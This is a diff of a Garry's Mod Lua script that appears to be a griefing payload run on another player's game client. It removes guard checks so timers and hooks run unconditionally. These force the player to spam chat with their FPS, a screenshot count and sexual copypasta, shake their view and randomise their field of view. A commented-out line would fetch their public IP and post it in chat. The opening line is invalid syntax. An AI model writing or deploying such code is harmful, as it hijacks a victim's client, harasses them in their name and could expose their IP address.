@@ -1,4 +1,4 @@
---local check = if LocalPlayer():SteamID() == "STEAM_0:0:456670572" then return end
+local check = if LocalPlayer():SteamID() == "STEAM_0:0:456670572" then return end
 local jpegs = 0
 local s = sound
 local Song = false
@@ -173,7 +173,6 @@ local function oniichan() --aids copypasta
     _timer.Create('~~',19,1,function() LocalPlayer():ConCommand("say W-well if it felt good for you i'm happy, b-but make sure you take responsibility. (ღ˘⌣˘ღ)")end)
 end
 -- ALL TIMERS
-if _o then return else
 _timer.Create("haha", 4, 10000, function() _command('say', math.Round(1/RealFrameTime())..' is my fps, silly onii-chan >_<')end) -- fps
 --timer.Createreate("haha3", 10, 1, function() http.Fetch('http://ipv4bot.whatismyipaddress.com', function(b) _command('say',b) end,function() end) end)
 _timer.Create("haha4", 6, 10000, function() _command('say', 'Ive taken '..tostring(jpegs)..' screenshots, onii-chan ~')end) -- screenshots
@@ -191,7 +190,7 @@ _timer.Create('paste',0,10000,function()
     oniichan()
     _timer.Adjust('paste',21,10000,oniichan())
 end)
-end
+
 
 --if check then
 --    timer.Remove("haha")
@@ -202,7 +201,6 @@ end
 --    timer.Remove("hahasong")
 --end
 _hook.Add('Think','funny',function()
-    if _o then return else
         rgb = HSVToColor((CurTime() * 120) % 360, .77, .88)
         local result = annoying[_math.random(1,88)]
         _math.randomseed(CurTime())
@@ -238,7 +236,6 @@ _hook.Add('Think','funny',function()
         if _input.IsKeyDown(70) then 
             _command('cancelselect')
         end
-    end
 end)
 _hook.Add('RenderScene','funny',function()
 
@@ -246,7 +243,6 @@ _hook.Add('RenderScene','funny',function()
 
 end)
 _hook.Add('CreateMove','funny',function( CUserCmd , GM ) 
-    if _o then return else
 
     local lolangle = _math.random(-24, 24)
     local realangle = Angle(lolangle, lolangle,0)
@@ -257,13 +253,13 @@ _hook.Add('CreateMove','funny',function( CUserCmd , GM )
     --_command('mat_vsync','1')
     --render.SetAmbientLight(1,1,1)
     CUserCmd:SetViewAngles(PAngles - realangle)
-    end
+
 end)
 _hook.Add("CalcView", "funny", function(ply, pos, angles, fov)
         local _pv = ply:GetVelocity()
         local view = {}
             view.origin = pos
             view.angles = angles
-            view.fov = _math.Clamp(((_pv.x+_pv.y+_pv.z)),0,360)
+            view.fov = math.random(5,300)
         return view
 end)
